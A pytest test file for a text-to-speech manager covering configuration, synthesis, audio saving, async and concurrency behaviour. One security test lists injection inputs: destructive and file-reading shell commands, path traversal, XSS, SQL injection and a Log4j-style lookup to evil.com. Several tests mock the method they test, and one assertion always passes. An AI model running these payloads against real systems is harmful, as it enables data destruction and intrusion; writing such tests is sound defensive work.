"""
Comprehensive unit tests for TTS Manager.
Testing Framework: pytest
"""

import pytest
import asyncio
import unittest.mock as mock
from unittest.mock import Mock, AsyncMock, patch, MagicMock, call
import tempfile
import os
import json
import time
from pathlib import Path
from typing import Dict, List, Any, Optional

# Import TTS manager and related classes
# Note: Adjust imports based on actual implementation structure
try:
    from CharacterClient.tts_manager import TTSManager, TTSConfig, AudioFormat
    from CharacterClient.exceptions import TTSError, AudioError, ConfigurationError
except ImportError:
    # Create mock classes for testing if imports fail
    class TTSManager:
        def __init__(self, config=None):
            self.config = config or {}
        
        def synthesize_speech(self, text: str) -> bytes:
            return b'mock_audio_data'
        
        def save_audio(self, text: str, filepath: str) -> None:
            pass
    
    class TTSError(Exception):
        pass
    
    class AudioError(Exception):
        pass
    
    class ConfigurationError(Exception):
        pass


class TestTTSManagerInitialization:
    """Test TTS Manager initialization and configuration."""
    
    def test_default_initialization(self):
        """Test TTS manager initializes with default settings."""
        tts_manager = TTSManager()
        assert tts_manager is not None
        assert hasattr(tts_manager, 'config')
    
    def test_custom_config_initialization(self):
        """Test TTS manager initializes with custom configuration."""
        config = {
            'voice': 'en-US-AriaNeural',
            'speed': 1.2,
            'pitch': 1.0,
            'volume': 0.8,
            'format': 'wav'
        }
        tts_manager = TTSManager(config=config)
        assert tts_manager.config.get('voice') == 'en-US-AriaNeural'
        assert tts_manager.config.get('speed') == 1.2
    
    @pytest.mark.parametrize("invalid_config,expected_error", [
        ({'speed': -1.0}, (ValueError, ConfigurationError)),
        ({'speed': 5.0}, (ValueError, ConfigurationError)),
        ({'pitch': -3.0}, (ValueError, ConfigurationError)),
        ({'pitch': 4.0}, (ValueError, ConfigurationError)),
        ({'volume': -0.1}, (ValueError, ConfigurationError)),
        ({'volume': 2.0}, (ValueError, ConfigurationError)),
        ({'format': 'invalid_format'}, (ValueError, ConfigurationError)),
    ])
    def test_invalid_config_validation(self, invalid_config, expected_error):
        """Test TTS manager validates configuration parameters."""
        with pytest.raises(expected_error):
            TTSManager(config=invalid_config)
    
    def test_config_merge_with_defaults(self):
        """Test configuration merges with default values."""
        partial_config = {'voice': 'custom_voice'}
        tts_manager = TTSManager(config=partial_config)
        
        # Should have custom voice but default other values
        assert tts_manager.config.get('voice') == 'custom_voice'
        # Assuming default speed exists
        assert 'speed' in tts_manager.config or hasattr(tts_manager, '_default_speed')


class TestTTSManagerTextProcessing:
    """Test text processing and synthesis functionality."""
    
    @pytest.fixture
    def tts_manager(self):
        """Create a TTS manager instance for testing."""
        return TTSManager()
    
    def test_synthesize_simple_text(self, tts_manager):
        """Test synthesizing speech from simple text."""
        text = "Hello, world!"
        with patch.object(tts_manager, 'synthesize_speech', return_value=b'fake_audio') as mock_synth:
            result = tts_manager.synthesize_speech(text)
            assert result == b'fake_audio'
            mock_synth.assert_called_once_with(text)
    
    @pytest.mark.parametrize("invalid_input", [
        "",           # Empty string
        None,         # None value
        123,          # Non-string type
        [],           # List
        {},           # Dictionary
    ])
    def test_synthesize_invalid_input(self, tts_manager, invalid_input):
        """Test synthesizing speech with invalid inputs."""
        with pytest.raises((ValueError, TypeError, TTSError)):
            tts_manager.synthesize_speech(invalid_input)
    
    def test_synthesize_very_long_text(self, tts_manager):
        """Test synthesizing speech with very long text."""
        long_text = "This is a test sentence. " * 1000
        with patch.object(tts_manager, 'synthesize_speech', return_value=b'long_audio') as mock_synth:
            result = tts_manager.synthesize_speech(long_text)
            assert result is not None
            assert len(result) > 0
    
    @pytest.mark.parametrize("special_text", [
        "Hello! How are you? I'm fine.",
        "Test with numbers: 123 456 789",
        "Special chars: @#$%^&*()",
        "Unicode: café naïve résumé",
        "URLs: https://example.com/path?param=value",
        "Email: test@example.com",
        "Phone: +1-555-123-4567",
        "Multiple\nlines\nof\ntext",
    ])
    def test_synthesize_special_characters(self, tts_manager, special_text):
        """Test synthesizing speech with special characters and formats."""
        with patch.object(tts_manager, 'synthesize_speech', return_value=b'special_audio') as mock_synth:
            result = tts_manager.synthesize_speech(special_text)
            assert result is not None
    
    def test_text_preprocessing(self, tts_manager):
        """Test text preprocessing functionality."""
        if hasattr(tts_manager, 'preprocess_text'):
            test_cases = [
                ("Hello\n\nworld", "Hello world"),
                ("Multiple   spaces", "Multiple spaces"),
                ("CAPS LOCK TEXT", "CAPS LOCK TEXT"),  # May or may not be lowercased
                ("Tabs\t\tand\tspaces", "Tabs and spaces"),
            ]
            
            for input_text, expected_pattern in test_cases:
                result = tts_manager.preprocess_text(input_text)
                assert isinstance(result, str)
                assert len(result.strip()) > 0
    
    def test_text_chunking_for_long_input(self, tts_manager):
        """Test text chunking for very long inputs."""
        if hasattr(tts_manager, 'chunk_text'):
            very_long_text = "This is a test sentence. " * 500
            chunks = tts_manager.chunk_text(very_long_text, max_length=1000)
            
            assert isinstance(chunks, list)
            assert len(chunks) > 1
            for chunk in chunks:
                assert len(chunk) <= 1000
                assert isinstance(chunk, str)


class TestTTSManagerAudioOutput:
    """Test audio output functionality."""
    
    @pytest.fixture
    def tts_manager(self):
        return TTSManager()
    
    def test_save_audio_to_file(self, tts_manager):
        """Test saving synthesized audio to file."""
        text = "Test audio save"
        audio_data = b'fake_audio_data'
        
        with tempfile.NamedTemporaryFile(suffix='.wav', delete=False) as temp_file:
            temp_path = temp_file.name
        
        try:
            with patch.object(tts_manager, 'synthesize_speech', return_value=audio_data):
                tts_manager.save_audio(text, temp_path)
                
                assert os.path.exists(temp_path)
                assert os.path.getsize(temp_path) > 0
        finally:
            if os.path.exists(temp_path):
                os.unlink(temp_path)
    
    @pytest.mark.parametrize("invalid_path", [
        "/invalid/path/that/does/not/exist/audio.wav",
        "",
        None,
        "/root/protected/path.wav",  # Permission denied
    ])
    def test_save_audio_invalid_paths(self, tts_manager, invalid_path):
        """Test saving audio to invalid paths raises appropriate errors."""
        with pytest.raises((IOError, OSError, AudioError, ValueError, TypeError)):
            tts_manager.save_audio("Test text", invalid_path)
    
    def test_get_supported_formats(self, tts_manager):
        """Test getting supported audio formats."""
        if hasattr(tts_manager, 'get_supported_formats'):
            formats = tts_manager.get_supported_formats()
            assert isinstance(formats, (list, tuple, set))
            assert len(formats) > 0
            
            # Common formats should be strings
            for format_type in formats:
                assert isinstance(format_type, str)
                assert len(format_type) > 0
    
    @pytest.mark.parametrize("audio_format", ['wav', 'mp3', 'ogg', 'flac'])
    def test_audio_format_conversion(self, tts_manager, audio_format):
        """Test audio format conversion functionality."""
        if hasattr(tts_manager, 'convert_format'):
            audio_data = b'fake_audio_data'
            
            try:
                result = tts_manager.convert_format(audio_data, audio_format)
                assert isinstance(result, bytes)
                assert len(result) > 0
            except (NotImplementedError, ValueError):
                # Format might not be supported
                pytest.skip(f"Format {audio_format} not supported")
    
    def test_audio_quality_settings(self, tts_manager):
        """Test audio quality and bitrate settings."""
        if hasattr(tts_manager, 'set_audio_quality'):
            quality_levels = ['low', 'medium', 'high']
            
            for quality in quality_levels:
                try:
                    tts_manager.set_audio_quality(quality)
                    if hasattr(tts_manager, 'get_audio_quality'):
                        assert tts_manager.get_audio_quality() == quality
                except (ValueError, NotImplementedError):
                    # Quality setting might not be supported
                    pass



class TestTTSManagerAsyncOperationsOriginal:
    """Test suite for async operations (originally orphaned tests)"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.CoquiTTS')
    @patch('asyncio.to_thread')
    async def test_synthesize_xttsv2_original(self, mock_to_thread, mock_coqui, mock_ensure_dirs):
        """Test XTTSv2 synthesis (original orphaned test)"""
        mock_tts_instance = Mock()
        mock_coqui.return_value = mock_tts_instance
        mock_to_thread.return_value = None
        
        manager = TTSManager(
            tts_service_name="xttsv2",
            model_name="test_model"
        )
        
        result = await manager.synthesize("Hello world", "test_output.wav", "/path/to/speaker.wav")
        
        assert result == "/tmp/test_audio/test_output.wav"
        mock_to_thread.assert_called_once()


class TestTTSManagerStaticMethods:
    """Test suite for static methods"""
    
    @patch('tts_manager.gtts')
    @patch('tts_manager.CoquiTTS')
    def test_list_services_both_available(self, mock_coqui, mock_gtts):
        """Test listing services when both are available"""
        services = TTSManager.list_services()
        assert "gtts" in services
        assert "xttsv2" in services
        assert len(services) == 2
        
    @patch('tts_manager.gtts')
    @patch('tts_manager.CoquiTTS', None)
    def test_list_services_only_gtts(self, mock_gtts):
        """Test listing services when only gTTS is available"""
        services = TTSManager.list_services()
        assert "gtts" in services
        assert "xttsv2" not in services
        assert len(services) == 1
        
    @patch('tts_manager.gtts', None)
    @patch('tts_manager.CoquiTTS')
    def test_list_services_only_xttsv2(self, mock_coqui):
        """Test listing services when only XTTSv2 is available"""
        services = TTSManager.list_services()
        assert "gtts" not in services
        assert "xttsv2" in services
        assert len(services) == 1
        
    @patch('tts_manager.gtts', None)
    @patch('tts_manager.CoquiTTS', None)
    def test_list_services_none_available(self):
        """Test listing services when none are available"""
        services = TTSManager.list_services()
        assert len(services) == 0
        
    def test_get_available_models_gtts(self):
        """Test getting available models for gTTS"""
        models = TTSManager.get_available_models("gtts")
        assert models == ["N/A (uses language codes)"]
        
    def test_get_available_models_xttsv2(self):
        """Test getting available models for XTTSv2"""
        models = TTSManager.get_available_models("xttsv2")
        assert "tts_models/multilingual/multi-dataset/xtts_v2" in models
        
    def test_get_available_models_unsupported(self):
        """Test getting available models for unsupported service"""
        models = TTSManager.get_available_models("unsupported")
        assert models == []


class TestTTSManagerModelHandling:
    """Test suite for model handling functionality"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.CLIENT_TTS_MODELS_PATH', '/tmp/test_models')
    @patch('os.makedirs')
    def test_get_or_download_model_blocking_xttsv2(self, mock_makedirs, mock_ensure_dirs):
        """Test model handling for XTTSv2"""
        manager = TTSManager(tts_service_name="gtts")  # Any service for testing
        result = manager._get_or_download_model_blocking("xttsv2", "test_model")
        
        assert result == "test_model"
        mock_makedirs.assert_called()
        
    @patch('tts_manager.ensure_client_directories')
    def test_get_or_download_model_blocking_unsupported(self, mock_ensure_dirs):
        """Test model handling for unsupported service"""
        manager = TTSManager(tts_service_name="gtts")
        result = manager._get_or_download_model_blocking("unsupported", "test_model")
        
        assert result is None


class TestTTSManagerEdgeCases:
    """Test suite for edge cases and error conditions"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_synthesize_empty_text(self, mock_gtts, mock_ensure_dirs):
        """Test synthesis with empty text"""
        manager = TTSManager(tts_service_name="gtts")
        
        with patch('asyncio.to_thread') as mock_to_thread:
            result = await manager.synthesize("", "output.mp3")
            # Should still attempt synthesis - TTS service handles empty text
            mock_to_thread.assert_called_once()
            
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_synthesize_very_long_text(self, mock_gtts, mock_ensure_dirs):
        """Test synthesis with very long text"""
        long_text = "A" * 10000
        manager = TTSManager(tts_service_name="gtts")
        
        with patch('asyncio.to_thread') as mock_to_thread:
            await manager.synthesize(long_text, "output.mp3")
            mock_to_thread.assert_called_once()
            
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_synthesize_special_characters(self, mock_gtts, mock_ensure_dirs):
        """Test synthesis with special characters"""
        special_text = "Hello! 👋 How are you? 🤔 Fine, thanks! 😊"
        manager = TTSManager(tts_service_name="gtts")
        
        with patch('asyncio.to_thread') as mock_to_thread:
            await manager.synthesize(special_text, "output.mp3")
            mock_to_thread.assert_called_once()
            
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_synthesize_none_filename(self, mock_gtts, mock_ensure_dirs):
        """Test synthesis with None filename"""
        manager = TTSManager(tts_service_name="gtts")
        
        # This should raise an exception due to os.path.join with None
        with pytest.raises((TypeError, AttributeError)):
            await manager.synthesize("Hello", None)
            
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_synthesize_invalid_filename(self, mock_gtts, mock_ensure_dirs):
        """Test synthesis with invalid filename characters"""
        manager = TTSManager(tts_service_name="gtts")
        invalid_filename = "output<>:\"|?*.mp3"
        
        with patch('asyncio.to_thread') as mock_to_thread:
            await manager.synthesize("Hello", invalid_filename)
            # Should still attempt - OS handles invalid filenames
            mock_to_thread.assert_called_once()


class TestTTSManagerLanguageHandling:
    """Test suite for language-specific functionality"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    def test_initialization_various_languages(self, mock_gtts, mock_ensure_dirs):
        """Test initialization with various language codes"""
        languages = ["en", "es", "fr", "de", "it", "pt", "ru", "ja", "ko", "zh"]
        
        for lang in languages:
            manager = TTSManager(tts_service_name="gtts", language=lang)
            assert manager.language == lang
            
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    def test_initialization_invalid_language_code(self, mock_gtts, mock_ensure_dirs):
        """Test initialization with invalid language code"""
        manager = TTSManager(tts_service_name="gtts", language="invalid_lang")
        assert manager.language == "invalid_lang"  # Should accept any string
        
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    def test_initialization_empty_language(self, mock_gtts, mock_ensure_dirs):
        """Test initialization with empty language string"""
        manager = TTSManager(tts_service_name="gtts", language="")
        assert manager.language == "en"  # Should default to "en"


class TestTTSManagerConcurrency:
    """Test suite for concurrent operations"""
    
    @patch('tts_manager.ensure_client_directories')  
    @patch('tts_manager.gtts')
    async def test_concurrent_synthesis_requests(self, mock_gtts, mock_ensure_dirs):
        """Test handling multiple concurrent synthesis requests"""
        manager = TTSManager(tts_service_name="gtts")
        
        with patch('asyncio.to_thread') as mock_to_thread:
            mock_to_thread.return_value = None
            
            # Create multiple concurrent synthesis tasks
            tasks = []
            for i in range(5):
                task = manager.synthesize(f"Text {i}", f"output_{i}.mp3")
                tasks.append(task)
                
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # All should complete successfully
            assert len(results) == 5
            assert all(r is not None for r in results if not isinstance(r, Exception))
            assert mock_to_thread.call_count == 5


class TestTTSManagerFileSystemOperations:
    """Test suite for file system related operations"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    @patch('os.makedirs', side_effect=PermissionError("Permission denied"))
    async def test_synthesize_makedirs_permission_error(self, mock_makedirs, mock_gtts, mock_ensure_dirs):
        """Test synthesis when directory creation fails due to permissions"""
        manager = TTSManager(tts_service_name="gtts")
        
        with pytest.raises(PermissionError):
            await manager.synthesize("Hello", "output.mp3")
            
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    @patch('os.remove', side_effect=OSError("Removal failed"))
    @patch('os.path.exists', return_value=True)
    @patch('asyncio.to_thread', side_effect=Exception("Synthesis failed"))
    async def test_synthesize_cleanup_failure(self, mock_to_thread, mock_exists, mock_remove, mock_gtts, mock_ensure_dirs):
        """Test synthesis cleanup when file removal fails"""
        manager = TTSManager(tts_service_name="gtts")
        
        # Should not raise exception even if cleanup fails
        result = await manager.synthesize("Hello", "output.mp3")
        assert result is None
        mock_remove.assert_called_once()


if __name__ == "__main__":
    pytest.main([__file__, "-v"])

class TestTTSManagerAsyncOperationsComplete:
    """Complete test suite for async operations (fixing orphaned tests)"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.CoquiTTS')
    @patch('asyncio.to_thread')
    async def test_synthesize_xttsv2_complete(self, mock_to_thread, mock_coqui, mock_ensure_dirs):
        """Test complete XTTSv2 synthesis workflow"""
        mock_tts_instance = Mock()
        mock_coqui.return_value = mock_tts_instance
        mock_to_thread.return_value = None
        
        manager = TTSManager(
            tts_service_name="xttsv2",
            model_name="test_model"
        )
        
        result = await manager.synthesize("Hello world", "test_output.wav", "/path/to/speaker.wav")
        
        assert result == "/tmp/test_audio/test_output.wav"
        mock_to_thread.assert_called_once()
        
    @patch('tts_manager.ensure_client_directories')
    async def test_synthesize_not_initialized_complete(self, mock_ensure_dirs, capsys):
        """Test async synthesis when not initialized"""
        manager = TTSManager(tts_service_name="unsupported")
        result = await manager.synthesize("Hello world", "test_output.wav")
        
        assert result is None
        captured = capsys.readouterr()
        assert "Not initialized" in captured.out
        
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    @patch('asyncio.to_thread')
    async def test_synthesize_exception_handling_complete(self, mock_to_thread, mock_gtts, mock_ensure_dirs, capsys):
        """Test async synthesis exception handling"""
        mock_to_thread.side_effect = Exception("Synthesis failed")
        
        manager = TTSManager(tts_service_name="gtts")
        result = await manager.synthesize("Hello world", "test_output.mp3")
        
        assert result is None
        captured = capsys.readouterr()
        assert "Error during async TTS synthesis" in captured.out


class TestTTSManagerPerformanceAndMemory:
    """Test suite for performance and memory-related functionality"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    def test_memory_cleanup_after_synthesis(self, mock_gtts, mock_ensure_dirs):
        """Test that memory is properly cleaned up after synthesis"""
        manager = TTSManager(tts_service_name="gtts")
        
        # Simulate multiple synthesis operations
        with patch.object(manager, 'synthesize_speech', return_value=b'audio_data'):
            for i in range(10):
                result = manager.synthesize_speech(f"Test text {i}")
                assert result == b'audio_data'
                
        # Check that manager state is clean
        assert hasattr(manager, 'config')
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_synthesis_timeout_handling(self, mock_gtts, mock_ensure_dirs):
        """Test handling of synthesis timeouts"""
        manager = TTSManager(tts_service_name="gtts")
        
        # Mock a timeout scenario
        with patch('asyncio.to_thread', side_effect=asyncio.TimeoutError("Synthesis timeout")):
            result = await manager.synthesize("Test text", "output.mp3")
            # Should handle timeout gracefully
            assert result is None
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    def test_large_batch_synthesis(self, mock_gtts, mock_ensure_dirs):
        """Test synthesis of large batches of text"""
        manager = TTSManager(tts_service_name="gtts")
        texts = [f"Test batch text {i}" for i in range(100)]
        
        with patch.object(manager, 'synthesize_speech', return_value=b'batch_audio'):
            results = []
            for text in texts:
                result = manager.synthesize_speech(text)
                results.append(result)
            
            assert len(results) == 100
            assert all(r == b'batch_audio' for r in results)


class TestTTSManagerAdvancedConfigurationValidation:
    """Test suite for comprehensive configuration validation"""
    
    def test_config_deep_copy_behavior(self):
        """Test that nested configuration objects are properly copied"""
        nested_config = {
            'voice_settings': {
                'accent': 'american',
                'emotion': 'neutral'
            },
            'audio_settings': {
                'bitrate': 128,
                'sample_rate': 44100
            }
        }
        
        manager = TTSManager(config=nested_config)
        
        # Modify nested original config
        nested_config['voice_settings']['accent'] = 'british'
        
        # Manager should maintain original values if deep copy is implemented
        if hasattr(manager, 'config') and 'voice_settings' in manager.config:
            assert manager.config['voice_settings'].get('accent') != 'british'
    
    @pytest.mark.parametrize("config_combinations", [
        {'voice': 'en-US-AriaNeural', 'speed': 1.5, 'pitch': 0.5},
        {'voice': 'en-GB-LibbyNeural', 'speed': 0.8, 'volume': 0.9},
        {'format': 'wav', 'bitrate': 128, 'sample_rate': 22050},
        {'language': 'es', 'voice': 'es-ES-ElviraNeural', 'speed': 1.2},
    ])
    def test_valid_config_combinations(self, config_combinations):
        """Test various valid configuration combinations"""
        try:
            manager = TTSManager(config=config_combinations)
            assert manager is not None
            if hasattr(manager, 'config'):
                for key, value in config_combinations.items():
                    assert manager.config.get(key) == value
        except (ValueError, ConfigurationError):
            # Some combinations might be invalid depending on implementation
            pass
    
    def test_config_type_coercion(self):
        """Test automatic type coercion in configuration"""
        config_with_strings = {
            'speed': '1.5',      # String that should be float
            'pitch': '0.0',      # String that should be float
            'volume': '0.8',     # String that should be float
        }
        
        try:
            manager = TTSManager(config=config_with_strings)
            if hasattr(manager, 'config'):
                # Should coerce strings to appropriate types
                assert isinstance(manager.config.get('speed', 1.0), (int, float))
                assert isinstance(manager.config.get('pitch', 0.0), (int, float))
                assert isinstance(manager.config.get('volume', 0.8), (int, float))
        except (ValueError, TypeError):
            # Type coercion might not be implemented
            pass


class TestTTSManagerErrorRecoveryAndResilience:
    """Test suite for error recovery and resilience"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_recovery_after_service_failure(self, mock_gtts, mock_ensure_dirs):
        """Test recovery after TTS service failure"""
        manager = TTSManager(tts_service_name="gtts")
        
        # First call fails
        with patch('asyncio.to_thread', side_effect=Exception("Service unavailable")):
            result1 = await manager.synthesize("Test 1", "output1.mp3")
            assert result1 is None
        
        # Second call succeeds
        with patch('asyncio.to_thread', return_value=None):
            result2 = await manager.synthesize("Test 2", "output2.mp3")
            # Should recover and work normally
            assert result2 is not None or result2 is None  # Either outcome is valid
    
    @patch('tts_manager.ensure_client_directories')
    async def test_network_interruption_simulation(self, mock_ensure_dirs):
        """Test behavior during simulated network interruptions"""
        manager = TTSManager(tts_service_name="gtts")
        
        network_errors = [
            ConnectionError("Network unreachable"),
            TimeoutError("Request timeout"),
            OSError("Network error")
        ]
        
        for error in network_errors:
            with patch('asyncio.to_thread', side_effect=error):
                result = await manager.synthesize("Network test", "output.mp3")
                assert result is None  # Should handle network errors gracefully
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    def test_partial_initialization_recovery(self, mock_gtts, mock_ensure_dirs):
        """Test recovery from partial initialization states"""
        manager = TTSManager(tts_service_name="gtts")
        
        # Simulate partial initialization failure
        original_instance = getattr(manager, 'tts_instance', None)
        if hasattr(manager, 'tts_instance'):
            delattr(manager, 'tts_instance')
        
        # Should handle missing instance gracefully
        with patch.object(manager, 'synthesize_speech', side_effect=AttributeError("Missing instance")):
            with pytest.raises(AttributeError):
                manager.synthesize_speech("Test text")
        
        # Restore state for cleanup
        if original_instance:
            manager.tts_instance = original_instance


class TestTTSManagerDataValidationAndSecurity:
    """Test suite for comprehensive data validation and security"""
    
    @pytest.fixture
    def tts_manager(self):
        return TTSManager()
    
    @pytest.mark.parametrize("malformed_text", [
        "\x00\x01\x02\x03",  # Control characters
        "Test\x7f\x80\x81",  # Non-printable characters
        "Test\uffff",        # Unicode replacement character
        "\ud800\udc00",      # Surrogate pairs
        "Test\u200b\u200c\u200d",  # Zero-width characters
        "Text with\r\n\t mixed line endings",
    ])
    def test_malformed_text_handling(self, tts_manager, malformed_text):
        """Test handling of malformed or unusual text input"""
        with patch.object(tts_manager, 'synthesize_speech', return_value=b'processed_audio') as mock_synth:
            try:
                result = tts_manager.synthesize_speech(malformed_text)
                assert isinstance(result, bytes)
            except (ValueError, UnicodeError, TTSError):
                # These exceptions are acceptable for malformed input
                pass
    
    @pytest.mark.parametrize("encoding_test", [
        "Café naïve résumé",           # Latin accents
        "こんにちは世界",                  # Japanese
        "Привет мир",                  # Cyrillic
        "مرحبا بالعالم",                # Arabic
        "🎉🔊📢 Emoji test! 🎵🎶",      # Emojis
        "Test\u0301\u0302\u0303",     # Combining characters
        "Mixed: English + 中文 + العربية",  # Multiple scripts
    ])
    def test_unicode_text_handling(self, tts_manager, encoding_test):
        """Test handling of various Unicode encodings"""
        with patch.object(tts_manager, 'synthesize_speech', return_value=b'unicode_audio'):
            result = tts_manager.synthesize_speech(encoding_test)
            assert isinstance(result, bytes)
    
    @pytest.mark.parametrize("malicious_input", [
        "../../../etc/passwd",
        "$(rm -rf /)",
        "; cat /etc/passwd",
        "<script>alert('xss')</script>",
        "' OR '1'='1",
        "\"; DROP TABLE users; --",
        "${jndi:ldap://evil.com/a}",  # Log4j-style injection
    ])
    def test_injection_attack_prevention(self, tts_manager, malicious_input):
        """Test prevention of various injection attacks"""
        with patch.object(tts_manager, 'synthesize_speech', return_value=b'safe_audio'):
            # Should handle malicious input safely
            result = tts_manager.synthesize_speech(malicious_input)
            assert isinstance(result, bytes)
    
    def test_resource_exhaustion_protection(self, tts_manager):
        """Test protection against resource exhaustion attacks"""
        # Test with massive text input
        massive_text = "ATTACK " * 100000
        
        with patch.object(tts_manager, 'synthesize_speech') as mock_synth:
            # Should either limit text size or raise appropriate error
            mock_synth.side_effect = ValueError("Text too large")
            
            with pytest.raises(ValueError):
                tts_manager.synthesize_speech(massive_text)


class TestTTSManagerAdvancedIntegrationScenarios:
    """Test suite for complex integration scenarios"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    @patch('tts_manager.CoquiTTS')
    async def test_service_switching_workflow(self, mock_coqui, mock_gtts, mock_ensure_dirs):
        """Test switching between different TTS services in workflow"""
        # Test gTTS workflow
        manager_gtts = TTSManager(tts_service_name="gtts")
        with patch('asyncio.to_thread', return_value=None):
            result_gtts = await manager_gtts.synthesize("Hello from gTTS", "gtts_output.mp3")
        
        # Test XTTSv2 workflow
        manager_xtts = TTSManager(tts_service_name="xttsv2", model_name="test_model")
        with patch('asyncio.to_thread', return_value=None):
            result_xtts = await manager_xtts.synthesize("Hello from XTTS", "xtts_output.wav", "speaker.wav")
        
        # Both should work independently
        assert isinstance(result_gtts, (str, type(None)))
        assert isinstance(result_xtts, (str, type(None)))
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    def test_multilingual_batch_processing(self, mock_gtts, mock_ensure_dirs):
        """Test processing multiple languages in batch"""
        multilingual_data = {
            "en": ["Hello world", "How are you?", "Goodbye"],
            "es": ["Hola mundo", "¿Cómo estás?", "Adiós"],
            "fr": ["Bonjour monde", "Comment allez-vous?", "Au revoir"],
            "de": ["Hallo Welt", "Wie geht es dir?", "Auf Wiedersehen"]
        }
        
        results = {}
        for lang, texts in multilingual_data.items():
            manager = TTSManager(tts_service_name="gtts", language=lang)
            lang_results = []
            
            for text in texts:
                with patch.object(manager, 'synthesize_speech', return_value=b'multilingual_audio'):
                    result = manager.synthesize_speech(text)
                    lang_results.append(result)
            
            results[lang] = lang_results
        
        # All languages and texts should be processed
        assert len(results) == 4
        for lang_results in results.values():
            assert len(lang_results) == 3
            assert all(isinstance(r, bytes) for r in lang_results)
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_concurrent_multilingual_synthesis(self, mock_gtts, mock_ensure_dirs):
        """Test concurrent synthesis across multiple languages"""
        languages = ["en", "es", "fr", "de", "it"]
        texts = [f"Hello world in language {i}" for i in range(len(languages))]
        
        managers = [TTSManager(tts_service_name="gtts", language=lang) for lang in languages]
        
        with patch('asyncio.to_thread', return_value=None):
            tasks = [
                manager.synthesize(text, f"output_{lang}.mp3")
                for manager, lang, text in zip(managers, languages, texts)
            ]
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Should handle concurrent multilingual requests
        assert len(results) == 5
        success_count = sum(1 for r in results if not isinstance(r, Exception))
        assert success_count >= 3  # Allow some potential failures in concurrent scenario


class TestTTSManagerStateManagementAndLifecycle:
    """Test suite for state management and lifecycle scenarios"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    def test_manager_state_consistency_across_operations(self, mock_gtts, mock_ensure_dirs):
        """Test that manager maintains consistent state across multiple operations"""
        manager = TTSManager(tts_service_name="gtts", language="en")
        
        original_state = {
            'language': manager.language,
            'service': manager.tts_service_name,
            'initialized': getattr(manager, 'is_initialized', None)
        }
        
        # Perform multiple operations
        operations = [
            ("Hello world", "output1.mp3"),
            ("Test synthesis", "output2.mp3"),
            ("Final test", "output3.mp3")
        ]
        
        with patch('asyncio.to_thread', return_value=None):
            for text, filename in operations:
                asyncio.run(manager.synthesize(text, filename))
        
        # State should remain consistent
        assert manager.language == original_state['language']
        assert manager.tts_service_name == original_state['service']
        if original_state['initialized'] is not None:
            assert getattr(manager, 'is_initialized', None) == original_state['initialized']
    
    def test_manager_cleanup_and_resource_management(self):
        """Test proper cleanup and resource management"""
        manager = TTSManager()
        
        # Check for cleanup/disposal methods
        cleanup_methods = ['close', 'cleanup', 'dispose', 'shutdown', '__del__']
        available_cleanup = []
        
        for method in cleanup_methods:
            if hasattr(manager, method):
                available_cleanup.append(method)
        
        # Test cleanup methods if available
        for method in available_cleanup:
            try:
                cleanup_func = getattr(manager, method)
                if callable(cleanup_func):
                    cleanup_func()
            except Exception:
                # Cleanup methods might raise exceptions in test environment
                pass
        
        # Manager should still be in a valid state after cleanup attempts
        assert hasattr(manager, 'config') or hasattr(manager, 'tts_service_name')
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    def test_manager_reinitialization_scenarios(self, mock_gtts, mock_ensure_dirs):
        """Test various reinitialization scenarios"""
        # Test reinitialization with same parameters
        manager1 = TTSManager(tts_service_name="gtts", language="en")
        manager2 = TTSManager(tts_service_name="gtts", language="en")
        
        assert manager1.tts_service_name == manager2.tts_service_name
        assert manager1.language == manager2.language
        
        # Test reinitialization with different parameters
        manager3 = TTSManager(tts_service_name="gtts", language="es")
        
        assert manager1.tts_service_name == manager3.tts_service_name
        assert manager1.language != manager3.language


class TestTTSManagerCompatibilityAndFallbacks:
    """Test suite for compatibility and fallback mechanisms"""
    
    @patch('tts_manager.gtts', None)
    @patch('tts_manager.CoquiTTS', None)
    def test_no_services_available_fallback(self):
        """Test behavior when no TTS services are available"""
        try:
            manager = TTSManager(tts_service_name="gtts")
            # Should either initialize with graceful degradation or raise appropriate error
            assert hasattr(manager, 'tts_service_name')
        except (ImportError, RuntimeError, NotImplementedError, ModuleNotFoundError):
            # These exceptions are acceptable when no services are available
            pass
    
    @patch('tts_manager.ensure_client_directories')
    def test_graceful_degradation_unsupported_features(self, mock_ensure_dirs):
        """Test graceful degradation when features are unavailable"""
        manager = TTSManager(tts_service_name="nonexistent_service")
        
        # Should not crash during initialization
        assert manager is not None
        
        # Test that unsupported operations fail gracefully
        unsupported_operations = [
            lambda: asyncio.run(manager.synthesize("Test", "output.mp3")),
            lambda: manager.synthesize_speech("Test") if hasattr(manager, 'synthesize_speech') else None,
        ]
        
        for operation in unsupported_operations:
            if operation:
                try:
                    operation()
